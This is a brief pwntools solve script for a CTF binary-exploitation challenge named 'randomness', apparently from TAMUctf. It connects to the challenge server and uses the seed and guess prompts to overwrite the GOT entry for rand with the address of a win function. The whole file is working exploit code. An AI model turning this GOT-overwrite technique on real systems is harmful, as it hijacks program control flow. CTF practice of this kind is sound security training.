from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="randomness")

elf = ELF("./randomness")

rand = elf.got.rand
win = elf.sym.win

# pass rand's got
p.sendlineafter(b"Enter a seed:\n", str(rand).encode())

# overwrite with win
p.sendlineafter(b"Enter your guess:\n", str(win).encode())

p.interactive()
